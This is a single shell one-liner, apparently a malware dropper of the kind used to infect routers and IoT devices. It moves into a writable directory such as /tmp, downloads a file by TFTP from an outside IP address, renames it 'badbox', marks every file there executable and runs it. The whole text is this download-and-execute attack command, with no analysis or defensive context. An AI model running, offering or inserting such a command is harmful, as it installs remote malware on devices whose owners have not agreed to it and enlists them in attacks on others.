cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 76.74.219.170;cat pftp >badbox;chmod +x *;./badbox
